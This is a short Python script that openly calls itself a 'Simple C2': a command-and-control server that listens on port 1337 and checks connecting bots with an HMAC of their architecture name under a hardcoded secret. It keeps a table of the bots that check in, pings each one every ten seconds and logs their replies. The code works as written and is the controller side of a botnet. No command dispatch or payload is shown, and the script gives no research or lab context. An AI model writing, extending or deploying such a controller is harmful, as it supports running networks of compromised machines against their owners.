#!/usr/bin/env python3
import socket
import threading
import time
import base64
import hmac
import hashlib

# Configuration
HOST = '0.0.0.0'
PORT = 1337
BOT_SECRET = base64.b64decode("kZPUbHYdNYRDXBjbR4SeWvUfvD5Sc90wMrC8XGa2Z54=")

# Connected bots
bots = {}
bot_lock = threading.Lock()

def handle_bot(client, addr, arch):
    print(f"[+] Bot connected: {addr} ({arch})")
    try:
        while True:
            # Send PING every 10 seconds
            client.send(b"PING\n")
            time.sleep(10)
            
            # Try to receive data
            client.settimeout(5)
            try:
                data = client.recv(1024)
                if data:
                    print(f"[+] Received from {arch}: {data.decode().strip()}")
            except socket.timeout:
                continue
            except:
                break
    except:
        pass
    finally:
        print(f"[-] Bot disconnected: {addr} ({arch})")
        with bot_lock:
            if arch in bots:
                del bots[arch]
        client.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(10)
    print(f"[*] Simple C2 listening on {HOST}:{PORT}")
    print("[*] Waiting for bots...")
    
    while True:
        client, addr = server.accept()
        print(f"[*] New connection from {addr}")
        
        try:
            # Get username (arch name)
            username = client.recv(1024).decode().strip()
            print(f"[*] Username: {username}")
            
            # Send password prompt
            client.send(b"Password: ")
            
            # Get password (HMAC)
            password = client.recv(1024).decode().strip()
            print(f"[*] Password: {password[:20]}...")
            
            # Verify
            expected = hmac.new(BOT_SECRET, username.encode(), hashlib.sha256).hexdigest()
            if password == expected:
                print(f"[+] Auth success for {username}")
                client.send(b"AUTH_OK\n")
                
                with bot_lock:
                    bots[username] = client
                
                # Start bot handler
                thread = threading.Thread(target=handle_bot, args=(client, addr, username))
                thread.daemon = True
                thread.start()
                
                # Show connected bots
                with bot_lock:
                    print(f"[*] Connected bots: {len(bots)}")
            else:
                print(f"[-] Auth failed for {username}")
                client.send(b"AUTH_FAIL\n")
                client.close()
        except Exception as e:
            print(f"[-] Error: {e}")
            client.close()

if __name__ == "__main__":
    main()
